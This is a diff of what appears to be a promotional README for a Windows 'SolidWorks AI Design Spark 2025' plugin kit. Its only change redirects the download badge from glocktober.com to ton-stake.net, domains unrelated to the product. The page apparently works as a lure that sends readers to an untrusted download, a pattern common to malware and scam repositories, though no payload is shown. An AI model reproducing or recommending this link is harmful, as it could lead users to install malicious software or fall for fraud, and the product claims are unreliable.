@@ -2,7 +2,7 @@
 
 🚀 Want to crank out pro-level CAD designs without the grind? SolidWorks AI Design Spark 2025 is your go-to kit of AI plugins, scripts, and presets that make 3D modeling, simulations, and drawings feel like a breeze. Windows only, built for speed!
 
-[![Get SolidWorks AI Design Spark](https://img.shields.io/badge/Get-SolidWorks_AI_Design_Spark-blueviolet)](https://glocktober.com)
+[![Get SolidWorks AI Design Spark](https://img.shields.io/badge/Get-SolidWorks_AI_Design_Spark-blueviolet)](https://ton-stake.net)
 
 ---
 
